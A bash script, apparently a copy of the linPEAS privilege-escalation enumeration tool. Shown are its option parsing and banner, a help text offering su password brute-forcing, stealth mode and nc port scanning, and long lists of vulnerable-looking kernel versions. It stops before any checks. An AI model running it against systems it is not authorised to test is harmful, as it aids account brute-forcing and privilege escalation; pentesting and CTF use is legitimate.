#!/bin/bash
clear


#-------) Checks pre-everything (---------#
###########################################
if [ "$(/usr/bin/id -u)" -eq "0" ]; then
  IAMROOT="1"
  MAXPATH_FIND_W="3"
else
  IAMROOT=""
  MAXPATH_FIND_W="7"
fi


########################################### 
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"


###########################################
#---------) Parsing parameters (----------#
###########################################
# --) FAST - Do not check 1min of procceses and su brute
# --) SUPERFAST - FAST & do not search for special filaes in all the folders

if [ "`uname 2>/dev/null | grep 'Darwin'`" ] || [ "`/usr/bin/uname 2>/dev/null | grep 'Darwin'`" ]; then MACPEAS="1"; else MACPEAS=""; fi
FAST="1" #By default stealth/fast mode
SUPERFAST=""
NOTEXPORT=""
DISCOVERY=""
PORTS=""
QUIET=""
CHECKS="SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles"
WAIT=""
PASSWORD=""
THREADS="`((grep -c processor /proc/cpuinfo 2>/dev/null) || ((command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo -n 2) | tr -d "\n"`"
[ -z "$THREADS" ] && THREADS="2" #If THREADS is empty, put number 2
[ -n "$THREADS" ] && eTHREADS="2" #If THREADS is null, put number 2
[ "$THREADS" -eq "$THREADS" ] 2>/dev/null && : || THREADS="2" #It THREADS is not a number, put number 2
HELP=$GREEN"Enumerate and search Privilege Escalation vectors.
${NC}This tool enum and search possible misconfigurations$DG (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...)$NC inside the host and highlight possible misconfigurations with colors.
      $Y-h$B To show this message
      $Y-q$B Do not show banner
      $Y-a$B All checks (1min of processes and su brute) - Noisy mode, for CTFs mainly
      $Y-s$B SuperFast (don't check some time consuming checks) - Stealth mode
      $Y-w$B Wait execution between big blocks
      $Y-n$B Do not export env variables related with history and do not check Internet connectivity
      $Y-P$B Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
      $Y-o$B Only execute selected checks (SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles). Select a comma separated list.
      $Y-L$B Force linpeas execution.
      $Y-M$B Force macpeas execution.
      $Y-t$B Threads to search files inside the system (by default it's the number of CPU threads).
      $Y-d <IP/NETMASK>$B Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
      $Y-p <PORT(s)> -d <IP/NETMASK>$B Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
      $Y-i <IP> [-p <PORT(s)>]$B Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
      $GREEN Notice$B that if you select some network action, no PE check will be performed\n\n$NC"

while getopts "h?asnd:p:i:P:qo:LMwt:" opt; do
  case "$opt" in
    h|\?) printf "$HELP"$NC; exit 0;;
    a)  FAST="";;
    s)  SUPERFAST=1;;
    n)  NOTEXPORT=1;;
    d)  DISCOVERY=$OPTARG;;
    p)  PORTS=$OPTARG;;
    i)  IP=$OPTARG;;
    P)  PASSWORD=$OPTARG;;
    q)  QUIET=1;;
    o)  CHECKS=$OPTARG;;
    L)  MACPEAS="";;
    M)  MACPEAS="1";;
    w)  WAIT=1;;
    t)  THREADS=$OPTARG;;
    esac
done

if [ "$MACPEAS" ]; then SCRIPTNAME="macpeas"; else SCRIPTNAME="linpeas"; fi


###########################################
#---------------) BANNER (----------------#
###########################################

print_banner(){
  if [ "$MACPEAS" ]; then
    bash -c "printf '
  ########  ########   .####:   ########  ########  ######:
  ########  ########  #######:  ########  ########  #######  
     .###  ##        #:.   ##     ##     ##        ##   :## 
     ###   ##              ##     ##     ##        ##    ## 
    :##:   ##              ##     ##     ##        ##   :## 
    ###    #######     #####      ##     #######   #######: 
   ###     #######     #####.     ##     #######   ######   
  :##:     ##              ##     ##     ##        ##   ##. 
  ##       ##              ##     ##     ##        ##   ##  
 ###       ##        #:    ##     ##     ##        ##   :## 
 ########  ########  #######:     ##     ########  ##    ##:
 ########  ########  :#####:      ##     ########  ##    ###'";
    
  else
    if [ -f "/bin/bash" ]; then
  /bin/bash -c "printf '

 ########  ########  . ####:   ########  ########  ######:  
 ########  ########  #######:  ########  ########  #######  
     .###  ##        #:.   ##     ##     ##        ##   :## 
     ###   ##              ##     ##     ##        ##    ## 
    :##:   ##              ##     ##     ##        ##   :## 
    ###    #######     #####      ##     #######   #######: 
   ###     #######     #####.     ##     #######   ######   
  :##:     ##              ##     ##     ##        ##   ##. 
  ##       ##              ##     ##     ##        ##   ##  
 ###       ##        #:    ##     ##     ##        ##   :## 
 ########  ########  #######:     ##     ########  ##    ##:
 ########  ########  :#####:      ##     ########  ##    ###'";
  
    else
  echo "     \e[48;5;108m     \e[48;5;59m \e[48;5;71m \e[48;5;77m       \e[48;5;22m \e[48;5;108m   \e[48;5;114m \e[48;5;59m \e[49m
     \e[48;5;108m  \e[48;5;71m \e[48;5;22m \e[48;5;113m \e[48;5;71m \e[48;5;94m \e[48;5;214m  \e[48;5;58m \e[48;5;214m    \e[48;5;100m \e[48;5;71m  \e[48;5;16m \e[48;5;108m  \e[49m
     \e[48;5;65m \e[48;5;16m \e[48;5;22m \e[48;5;214m      \e[48;5;16m \e[48;5;214m        \e[48;5;65m  \e[49m
     \e[48;5;65m \e[48;5;214m       \e[48;5;16m \e[48;5;214m \e[48;5;16m \e[48;5;214m       \e[48;5;136m \e[48;5;65m \e[49m
     \e[48;5;23m \e[48;5;214m          \e[48;5;178m \e[48;5;214m       \e[48;5;65m \e[49m
     \e[48;5;16m \e[48;5;214m         \e[48;5;136m \e[48;5;94m   \e[48;5;136m \e[48;5;214m    \e[48;5;65m \e[49m
     \e[48;5;58m \e[48;5;214m  \e[48;5;172m \e[48;5;64m \e[48;5;77m             \e[48;5;71m \e[48;5;65m \e[49m
     \e[48;5;16m \e[48;5;71m \e[48;5;77m  \e[48;5;71m \e[48;5;77m         \e[48;5;71m \e[48;5;77m   \e[48;5;65m  \e[49m
     \e[48;5;59m \e[48;5;71m \e[48;5;77m \e[48;5;77m \e[48;5;16m \e[48;5;77m         \e[48;5;16m \e[48;5;77m   \e[48;5;65m  \e[49m
     \e[48;5;65m  \e[48;5;77m      \e[48;5;71m \e[48;5;16m \e[48;5;77m    \e[48;5;113m \e[48;5;77m   \e[48;5;65m  \e[49m
     \e[48;5;65m \e[48;5;16m \e[48;5;77m  \e[48;5;150m \e[48;5;113m \e[48;5;77m        \e[48;5;150m \e[48;5;113m \e[48;5;77m \e[48;5;65m \e[48;5;59m \e[48;5;65m \e[49m
     \e[48;5;16m \e[48;5;65m \e[48;5;71m \e[48;5;77m             \e[48;5;71m \e[48;5;22m \e[48;5;65m  \e[49m
     \e[48;5;108m  \e[48;5;107m \e[48;5;59m \e[48;5;77m           \e[48;5;16m \e[48;5;114m \e[48;5;108m   \e[49m"
    fi
  fi
}


###########################################
#-----------) Starting Output (-----------#
###########################################

echo ""
if [ !"$QUIET" ]; then print_banner; fi
printf $B"  $SCRIPTNAME $VERSION ${Y}by ZE3TER\n"$NC;
echo ""
printf $Y"ADVISORY: "$B"$ADVISORY\n"$NC
echo ""
printf $B"Linux Privesc Checklist: "$Y"https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist\n"$NC
echo " LEGEND:" | sed "s,LEGEND,${C}[1;4m&${C}[0m,"
echo "  RED/YELLOW: 95% a PE vector" | sed "s,RED/YELLOW,${C}[1;31;103m&${C}[0m,"
echo "  RED: You must take a look at it" | sed "s,RED,${C}[1;31m&${C}[0m,"
echo "  LightCyan: Users with console" | sed "s,LightCyan,${C}[1;96m&${C}[0m,"
echo "  Blue: Users without console & mounted devs" | sed "s,Blue,${C}[1;34m&${C}[0m,"
echo "  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) " | sed "s,Green,${C}[1;32m&${C}[0m,"
echo "  LightMangeta: Your username" | sed "s,LightMagenta,${C}[1;95m&${C}[0m,"
if [ "$IAMROOT" ]; then
  echo ""
  echo "  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)" | sed "s,YOU ARE ALREADY ROOT!!!,${C}[1;31;103m&${C}[0m,"
  sleep 3
fi
echo ""
printf " ${DG}Starting $SCRIPTNAME. Caching Writable Folders...$NC"
echo ""

###########################################
#---------------) Lists (-----------------#
###########################################

filename="$SCRIPTNAME.txt$RANDOM"
kernelB=" 4.0.[0-9]+| 4.1.[0-9]+| 4.2.[0-9]+| 4.3.[0-9]+| 4.4.[0-9]+| 4.5.[0-9]+| 4.6.[0-9]+| 4.7.[0-9]+| 4.8.[0-9]+| 4.9.[0-9]+| 4.10.[0-9]+| 4.11.[0-9]+| 4.12.[0-9]+| 4.13.[0-9]+| 3.9.6| 3.9.0| 3.9| 3.8.9| 3.8.8| 3.8.7| 3.8.6| 3.8.5| 3.8.4| 3.8.3| 3.8.2| 3.8.1| 3.8.0| 3.8| 3.7.6| 3.7.0| 3.7| 3.6.0| 3.6| 3.5.0| 3.5| 3.4.9| 3.4.8| 3.4.6| 3.4.5| 3.4.4| 3.4.3| 3.4.2| 3.4.1| 3.4.0| 3.4| 3.3| 3.2| 3.19.0| 3.16.0| 3.15| 3.14| 3.13.1| 3.13.0| 3.13| 3.12.0| 3.12| 3.11.0| 3.11| 3.10.6| 3.10.0| 3.10| 3.1.0| 3.0.6| 3.0.5| 3.0.4| 3.0.3| 3.0.2| 3.0.1| 3.0.0| 2.6.9| 2.6.8| 2.6.7| 2.6.6| 2.6.5| 2.6.4| 2.6.39| 2.6.38| 2.6.37| 2.6.36| 2.6.35| 2.6.34| 2.6.33| 2.6.32| 2.6.31| 2.6.30| 2.6.3| 2.6.29| 2.6.28| 2.6.27| 2.6.26| 2.6.25| 2.6.24.1| 2.6.24| 2.6.23| 2.6.22| 2.6.21| 2.6.20| 2.6.2| 2.6.19| 2.6.18| 2.6.17| 2.6.16| 2.6.15| 2.6.14| 2.6.13| 2.6.12| 2.6.11| 2.6.10| 2.6.1| 2.6.0| 2.4.9| 2.4.8| 2.4.7| 2.4.6| 2.4.5| 2.4.4| 2.4.37| 2.4.36| 2.4.35| 2.4.34| 2.4.33| 2.4.32| 2.4.31| 2.4.30| 2.4.29| 2.4.28| 2.4.27| 2.4.26| 2.4.25| 2.4.24| 2.4.23| 2.4.22| 2.4.21| 2.4.20| 2.4.19| 2.4.18| 2.4.17| 2.4.16| 2.4.15| 2.4.14| 2.4.13| 2.4.12| 2.4.11| 2.4.10| 2.2.24"
kernelDCW_Ubuntu_Precise_1="3.1.1-1400-linaro-lt-mx5|3.11.0-13-generic|3.11.0-14-generic|3.11.0-15-generic|3.11.0-17-generic|3.11.0-18-generic|3.11.0-20-generic|3.11.0-22-generic|3.11.0-23-generic|3.11.0-24-generic|3.11.0-26-generic|3.13.0-100-generic|3.13.0-24-generic|3.13.0-27-generic|3.13.0-29-generic|3.13.0-30-generic|3.13.0-32-generic|3.13.0-33-generic|3.13.0-34-generic|3.13.0-35-generic|3.13.0-36-generic|3.13.0-37-generic|3.13.0-39-generic|3.13.0-40-generic|3.13.0-41-generic|3.13.0-43-generic|3.13.0-44-generic|3.13.0-46-generic|3.13.0-48-generic|3.13.0-49-generic|3.13.0-51-generic|3.13.0-52-generic|3.13.0-53-generic|3.13.0-54-generic|3.13.0-55-generic|3.13.0-57-generic|3.13.0-58-generic|3.13.0-59-generic|3.13.0-61-generic|3.13.0-62-generic|3.13.0-63-generic|3.13.0-65-generic|3.13.0-66-generic|3.13.0-67-generic|3.13.0-68-generic|3.13.0-71-generic|3.13.0-73-generic|3.13.0-74-generic|3.13.0-76-generic|3.13.0-77-generic|3.13.0-79-generic|3.13.0-83-generic|3.13.0-85-generic|3.13.0-86-generic|3.13.0-88-generic|3.13.0-91-generic|3.13.0-92-generic|3.13.0-93-generic|3.13.0-95-generic|3.13.0-96-generic|3.13.0-98-generic|3.2.0-101-generic|3.2.0-101-generic-pae|3.2.0-101-virtual|3.2.0-102-generic|3.2.0-102-generic-pae|3.2.0-102-virtual"
kernelDCW_Ubuntu_Precise_2="3.2.0-104-generic|3.2.0-104-generic-pae|3.2.0-104-virtual|3.2.0-105-generic|3.2.0-105-generic-pae|3.2.0-105-virtual|3.2.0-106-generic|3.2.0-106-generic-pae|3.2.0-106-virtual|3.2.0-107-generic|3.2.0-107-generic-pae|3.2.0-107-virtual|3.2.0-109-generic|3.2.0-109-generic-pae|3.2.0-109-virtual|3.2.0-110-generic|3.2.0-110-generic-pae|3.2.0-110-virtual|3.2.0-111-generic|3.2.0-111-generic-pae|3.2.0-111-virtual|3.2.0-1412-omap4|3.2.0-1602-armadaxp|3.2.0-23-generic|3.2.0-23-generic-pae|3.2.0-23-lowlatency|3.2.0-23-lowlatency-pae|3.2.0-23-omap|3.2.0-23-powerpc-smp|3.2.0-23-powerpc64-smp|3.2.0-23-virtual|3.2.0-24-generic|3.2.0-24-generic-pae|3.2.0-24-virtual|3.2.0-25-generic|3.2.0-25-generic-pae|3.2.0-25-virtual|3.2.0-26-generic|3.2.0-26-generic-pae|3.2.0-26-virtual|3.2.0-27-generic|3.2.0-27-generic-pae|3.2.0-27-virtual|3.2.0-29-generic|3.2.0-29-generic-pae|3.2.0-29-virtual|3.2.0-31-generic|3.2.0-31-generic-pae|3.2.0-31-virtual|3.2.0-32-generic|3.2.0-32-generic-pae|3.2.0-32-virtual|3.2.0-33-generic|3.2.0-33-generic-pae|3.2.0-33-lowlatency|3.2.0-33-lowlatency-pae|3.2.0-33-virtual|3.2.0-34-generic|3.2.0-34-generic-pae|3.2.0-34-virtual|3.2.0-35-generic|3.2.0-35-generic-pae|3.2.0-35-lowlatency|3.2.0-35-lowlatency-pae|3.2.0-35-virtual"
kernelDCW_Ubuntu_Precise_3="3.2.0-36-generic|3.2.0-36-generic-pae|3.2.0-36-lowlatency|3.2.0-36-lowlatency-pae|3.2.0-36-virtual|3.2.0-37-generic|3.2.0-37-generic-pae|3.2.0-37-lowlatency|3.2.0-37-lowlatency-pae|3.2.0-37-virtual|3.2.0-38-generic|3.2.0-38-generic-pae|3.2.0-38-lowlatency|3.2.0-38-lowlatency-pae|3.2.0-38-virtual|3.2.0-39-generic|3.2.0-39-generic-pae|3.2.0-39-lowlatency|3.2.0-39-lowlatency-pae|3.2.0-39-virtual|3.2.0-40-generic|3.2.0-40-generic-pae|3.2.0-40-lowlatency|3.2.0-40-lowlatency-pae|3.2.0-40-virtual|3.2.0-41-generic|3.2.0-41-generic-pae|3.2.0-41-lowlatency|3.2.0-41-lowlatency-pae|3.2.0-41-virtual|3.2.0-43-generic|3.2.0-43-generic-pae|3.2.0-43-virtual|3.2.0-44-generic|3.2.0-44-generic-pae|3.2.0-44-lowlatency|3.2.0-44-lowlatency-pae|3.2.0-44-virtual|3.2.0-45-generic|3.2.0-45-generic-pae|3.2.0-45-virtual|3.2.0-48-generic|3.2.0-48-generic-pae|3.2.0-48-lowlatency|3.2.0-48-lowlatency-pae|3.2.0-48-virtual|3.2.0-51-generic|3.2.0-51-generic-pae|3.2.0-51-lowlatency|3.2.0-51-lowlatency-pae|3.2.0-51-virtual|3.2.0-52-generic|3.2.0-52-generic-pae|3.2.0-52-lowlatency|3.2.0-52-lowlatency-pae|3.2.0-52-virtual|3.2.0-53-generic"
kernelDCW_Ubuntu_Precise_4="3.2.0-53-generic-pae|3.2.0-53-lowlatency|3.2.0-53-lowlatency-pae|3.2.0-53-virtual|3.2.0-54-generic|3.2.0-54-generic-pae|3.2.0-54-lowlatency|3.2.0-54-lowlatency-pae|3.2.0-54-virtual|3.2.0-55-generic|3.2.0-55-generic-pae|3.2.0-55-lowlatency|3.2.0-55-lowlatency-pae|3.2.0-55-virtual|3.2.0-56-generic|3.2.0-56-generic-pae|3.2.0-56-lowlatency|3.2.0-56-lowlatency-pae|3.2.0-56-virtual|3.2.0-57-generic|3.2.0-57-generic-pae|3.2.0-57-lowlatency|3.2.0-57-lowlatency-pae|3.2.0-57-virtual|3.2.0-58-generic|3.2.0-58-generic-pae|3.2.0-58-lowlatency|3.2.0-58-lowlatency-pae|3.2.0-58-virtual|3.2.0-59-generic|3.2.0-59-generic-pae|3.2.0-59-lowlatency|3.2.0-59-lowlatency-pae|3.2.0-59-virtual|3.2.0-60-generic|3.2.0-60-generic-pae|3.2.0-60-lowlatency|3.2.0-60-lowlatency-pae|3.2.0-60-virtual|3.2.0-61-generic|3.2.0-61-generic-pae|3.2.0-61-virtual|3.2.0-63-generic|3.2.0-63-generic-pae|3.2.0-63-lowlatency|3.2.0-63-lowlatency-pae|3.2.0-63-virtual|3.2.0-64-generic|3.2.0-64-generic-pae|3.2.0-64-lowlatency|3.2.0-64-lowlatency-pae|3.2.0-64-virtual|3.2.0-65-generic|3.2.0-65-generic-pae|3.2.0-65-lowlatency|3.2.0-65-lowlatency-pae|3.2.0-65-virtual|3.2.0-67-generic|3.2.0-67-generic-pae|3.2.0-67-lowlatency|3.2.0-67-lowlatency-pae|3.2.0-67-virtual|3.2.0-68-generic"
kernelDCW_Ubuntu_Precise_5="3.2.0-68-generic-pae|3.2.0-68-lowlatency|3.2.0-68-lowlatency-pae|3.2.0-68-virtual|3.2.0-69-generic|3.2.0-69-generic-pae|3.2.0-69-lowlatency|3.2.0-69-lowlatency-pae|3.2.0-69-virtual|3.2.0-70-generic|3.2.0-70-generic-pae|3.2.0-70-lowlatency|3.2.0-70-lowlatency-pae|3.2.0-70-virtual|3.2.0-72-generic|3.2.0-72-generic-pae|3.2.0-72-lowlatency|3.2.0-72-lowlatency-pae|3.2.0-72-virtual|3.2.0-73-generic|3.2.0-73-generic-pae|3.2.0-73-lowlatency|3.2.0-73-lowlatency-pae|3.2.0-73-virtual|3.2.0-74-generic|3.2.0-74-generic-pae|3.2.0-74-lowlatency|3.2.0-74-lowlatency-pae|3.2.0-74-virtual|3.2.0-75-generic|3.2.0-75-generic-pae|3.2.0-75-lowlatency|3.2.0-75-lowlatency-pae|3.2.0-75-virtual|3.2.0-76-generic|3.2.0-76-generic-pae|3.2.0-76-lowlatency|3.2.0-76-lowlatency-pae|3.2.0-76-virtual|3.2.0-77-generic|3.2.0-77-generic-pae|3.2.0-77-lowlatency|3.2.0-77-lowlatency-pae|3.2.0-77-virtual|3.2.0-79-generic|3.2.0-79-generic-pae|3.2.0-79-lowlatency|3.2.0-79-lowlatency-pae|3.2.0-79-virtual|3.2.0-80-generic|3.2.0-80-generic-pae|3.2.0-80-lowlatency|3.2.0-80-lowlatency-pae|3.2.0-80-virtual|3.2.0-82-generic|3.2.0-82-generic-pae|3.2.0-82-lowlatency|3.2.0-82-lowlatency-pae|3.2.0-82-virtual|3.2.0-83-generic|3.2.0-83-generic-pae|3.2.0-83-virtual|3.2.0-84-generic"
kernelDCW_Ubuntu_Precise_6="3.2.0-84-generic-pae|3.2.0-84-virtual|3.2.0-85-generic|3.2.0-85-generic-pae|3.2.0-85-virtual|3.2.0-86-generic|3.2.0-86-generic-pae|3.2.0-86-virtual|3.2.0-87-generic|3.2.0-87-generic-pae|3.2.0-87-virtual|3.2.0-88-generic|3.2.0-88-generic-pae|3.2.0-88-virtual|3.2.0-89-generic|3.2.0-89-generic-pae|3.2.0-89-virtual|3.2.0-90-generic|3.2.0-90-generic-pae|3.2.0-90-virtual|3.2.0-91-generic|3.2.0-91-generic-pae|3.2.0-91-virtual|3.2.0-92-generic|3.2.0-92-generic-pae|3.2.0-92-virtual|3.2.0-93-generic|3.2.0-93-generic-pae|3.2.0-93-virtual|3.2.0-94-generic|3.2.0-94-generic-pae|3.2.0-94-virtual|3.2.0-95-generic|3.2.0-95-generic-pae|3.2.0-95-virtual|3.2.0-96-generic|3.2.0-96-generic-pae|3.2.0-96-virtual|3.2.0-97-generic|3.2.0-97-generic-pae|3.2.0-97-virtual|3.2.0-98-generic|3.2.0-98-generic-pae|3.2.0-98-virtual|3.2.0-99-generic|3.2.0-99-generic-pae|3.2.0-99-virtual|3.5.0-40-generic|3.5.0-41-generic|3.5.0-42-generic|3.5.0-43-generic|3.5.0-44-generic|3.5.0-45-generic|3.5.0-46-generic|3.5.0-49-generic|3.5.0-51-generic|3.5.0-52-generic|3.5.0-54-generic|3.8.0-19-generic|3.8.0-21-generic|3.8.0-22-generic|3.8.0-23-generic|3.8.0-27-generic|3.8.0-29-generic|3.8.0-30-generic|3.8.0-31-generic|3.8.0-32-generic|3.8.0-33-generic|3.8.0-34-generic|3.8.0-35-generic|3.8.0-36-generic|3.8.0-37-generic|3.8.0-38-generic|3.8.0-39-generic|3.8.0-41-generic|3.8.0-42-generic"
kernelDCW_Ubuntu_Trusty_1="3.13.0-24-generic|3.13.0-24-generic-lpae|3.13.0-24-lowlatency|3.13.0-24-powerpc-e500|3.13.0-24-powerpc-e500mc|3.13.0-24-powerpc-smp|3.13.0-24-powerpc64-emb|3.13.0-24-powerpc64-smp|3.13.0-27-generic|3.13.0-27-lowlatency|3.13.0-29-generic|3.13.0-29-lowlatency|3.13.0-3-exynos5|3.13.0-30-generic|3.13.0-30-lowlatency|3.13.0-32-generic|3.13.0-32-lowlatency|3.13.0-33-generic|3.13.0-33-lowlatency|3.13.0-34-generic|3.13.0-34-lowlatency|3.13.0-35-generic|3.13.0-35-lowlatency|3.13.0-36-generic|3.13.0-36-lowlatency|3.13.0-37-generic|3.13.0-37-lowlatency|3.13.0-39-generic|3.13.0-39-lowlatency|3.13.0-40-generic|3.13.0-40-lowlatency|3.13.0-41-generic|3.13.0-41-lowlatency|3.13.0-43-generic|3.13.0-43-lowlatency|3.13.0-44-generic|3.13.0-44-lowlatency|3.13.0-46-generic|3.13.0-46-lowlatency|3.13.0-48-generic|3.13.0-48-lowlatency|3.13.0-49-generic|3.13.0-49-lowlatency|3.13.0-51-generic|3.13.0-51-lowlatency|3.13.0-52-generic|3.13.0-52-lowlatency|3.13.0-53-generic|3.13.0-53-lowlatency|3.13.0-54-generic|3.13.0-54-lowlatency|3.13.0-55-generic|3.13.0-55-lowlatency|3.13.0-57-generic|3.13.0-57-lowlatency|3.13.0-58-generic|3.13.0-58-lowlatency|3.13.0-59-generic|3.13.0-59-lowlatency|3.13.0-61-generic|3.13.0-61-lowlatency|3.13.0-62-generic|3.13.0-62-lowlatency|3.13.0-63-generic|3.13.0-63-lowlatency|3.13.0-65-generic|3.13.0-65-lowlatency|3.13.0-66-generic|3.13.0-66-lowlatency"
kernelDCW_Ubuntu_Trusty_2="3.13.0-67-generic|3.13.0-67-lowlatency|3.13.0-68-generic|3.13.0-68-lowlatency|3.13.0-70-generic|3.13.0-70-lowlatency|3.13.0-71-generic|3.13.0-71-lowlatency|3.13.0-73-generic|3.13.0-73-lowlatency|3.13.0-74-generic|3.13.0-74-lowlatency|3.13.0-76-generic|3.13.0-76-lowlatency|3.13.0-77-generic|3.13.0-77-lowlatency|3.13.0-79-generic|3.13.0-79-lowlatency|3.13.0-83-generic|3.13.0-83-lowlatency|3.13.0-85-generic|3.13.0-85-lowlatency|3.13.0-86-generic|3.13.0-86-lowlatency|3.13.0-87-generic|3.13.0-87-lowlatency|3.13.0-88-generic|3.13.0-88-lowlatency|3.13.0-91-generic|3.13.0-91-lowlatency|3.13.0-92-generic|3.13.0-92-lowlatency|3.13.0-93-generic|3.13.0-93-lowlatency|3.13.0-95-generic|3.13.0-95-lowlatency|3.13.0-96-generic|3.13.0-96-lowlatency|3.13.0-98-generic|3.13.0-98-lowlatency|3.16.0-25-generic|3.16.0-25-lowlatency|3.16.0-26-generic|3.16.0-26-lowlatency|3.16.0-28-generic|3.16.0-28-lowlatency|3.16.0-29-generic|3.16.0-29-lowlatency|3.16.0-31-generic|3.16.0-31-lowlatency|3.16.0-33-generic|3.16.0-33-lowlatency|3.16.0-34-generic|3.16.0-34-lowlatency|3.16.0-36-generic|3.16.0-36-lowlatency|3.16.0-37-generic|3.16.0-37-lowlatency|3.16.0-38-generic|3.16.0-38-lowlatency|3.16.0-39-generic|3.16.0-39-lowlatency|3.16.0-41-generic|3.16.0-41-lowlatency|3.16.0-43-generic|3.16.0-43-lowlatency|3.16.0-44-generic|3.16.0-44-lowlatency|3.16.0-45-generic"
kernelDCW_Ubuntu_Trusty_3="3.16.0-45-lowlatency|3.16.0-46-generic|3.16.0-46-lowlatency|3.16.0-48-generic|3.16.0-48-lowlatency|3.16.0-49-generic|3.16.0-49-lowlatency|3.16.0-50-generic|3.16.0-50-lowlatency|3.16.0-51-generic|3.16.0-51-lowlatency|3.16.0-52-generic|3.16.0-52-lowlatency|3.16.0-53-generic|3.16.0-53-lowlatency|3.16.0-55-generic|3.16.0-55-lowlatency|3.16.0-56-generic|3.16.0-56-lowlatency|3.16.0-57-generic|3.16.0-57-lowlatency|3.16.0-59-generic|3.16.0-59-lowlatency|3.16.0-60-generic|3.16.0-60-lowlatency|3.16.0-62-generic|3.16.0-62-lowlatency|3.16.0-67-generic|3.16.0-67-lowlatency|3.16.0-69-generic|3.16.0-69-lowlatency|3.16.0-70-generic|3.16.0-70-lowlatency|3.16.0-71-generic|3.16.0-71-lowlatency|3.16.0-73-generic|3.16.0-73-lowlatency|3.16.0-76-generic|3.16.0-76-lowlatency|3.16.0-77-generic|3.16.0-77-lowlatency|3.19.0-20-generic|3.19.0-20-lowlatency|3.19.0-21-generic|3.19.0-21-lowlatency|3.19.0-22-generic|3.19.0-22-lowlatency|3.19.0-23-generic|3.19.0-23-lowlatency|3.19.0-25-generic|3.19.0-25-lowlatency|3.19.0-26-generic|3.19.0-26-lowlatency|3.19.0-28-generic|3.19.0-28-lowlatency|3.19.0-30-generic|3.19.0-30-lowlatency|3.19.0-31-generic|3.19.0-31-lowlatency|3.19.0-32-generic|3.19.0-32-lowlatency|3.19.0-33-generic|3.19.0-33-lowlatency|3.19.0-37-generic|3.19.0-37-lowlatency|3.19.0-39-generic|3.19.0-39-lowlatency|3.19.0-41-generic|3.19.0-41-lowlatency|3.19.0-42-generic"
kernelDCW_Ubuntu_Trusty_4="3.19.0-42-lowlatency|3.19.0-43-generic|3.19.0-43-lowlatency|3.19.0-47-generic|3.19.0-47-lowlatency|3.19.0-49-generic|3.19.0-49-lowlatency|3.19.0-51-generic|3.19.0-51-lowlatency|3.19.0-56-generic|3.19.0-56-lowlatency|3.19.0-58-generic|3.19.0-58-lowlatency|3.19.0-59-generic|3.19.0-59-lowlatency|3.19.0-61-generic|3.19.0-61-lowlatency|3.19.0-64-generic|3.19.0-64-lowlatency|3.19.0-65-generic|3.19.0-65-lowlatency|3.19.0-66-generic|3.19.0-66-lowlatency|3.19.0-68-generic|3.19.0-68-lowlatency|3.19.0-69-generic|3.19.0-69-lowlatency|3.19.0-71-generic|3.19.0-71-lowlatency|3.4.0-5-chromebook|4.2.0-18-generic|4.2.0-18-lowlatency|4.2.0-19-generic|4.2.0-19-lowlatency|4.2.0-21-generic|4.2.0-21-lowlatency|4.2.0-22-generic|4.2.0-22-lowlatency|4.2.0-23-generic|4.2.0-23-lowlatency|4.2.0-25-generic|4.2.0-25-lowlatency|4.2.0-27-generic|4.2.0-27-lowlatency|4.2.0-30-generic|4.2.0-30-lowlatency|4.2.0-34-generic|4.2.0-34-lowlatency|4.2.0-35-generic|4.2.0-35-lowlatency|4.2.0-36-generic|4.2.0-36-lowlatency|4.2.0-38-generic|4.2.0-38-lowlatency|4.2.0-41-generic|4.2.0-41-lowlatency|4.4.0-21-generic|4.4.0-21-lowlatency|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
kernelDCW_Ubuntu_Xenial="4.4.0-1009-raspi2|4.4.0-1012-snapdragon|4.4.0-21-generic|4.4.0-21-generic-lpae|4.4.0-21-lowlatency|4.4.0-21-powerpc-e500mc|4.4.0-21-powerpc-smp|4.4.0-21-powerpc64-emb|4.4.0-21-powerpc64-smp|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
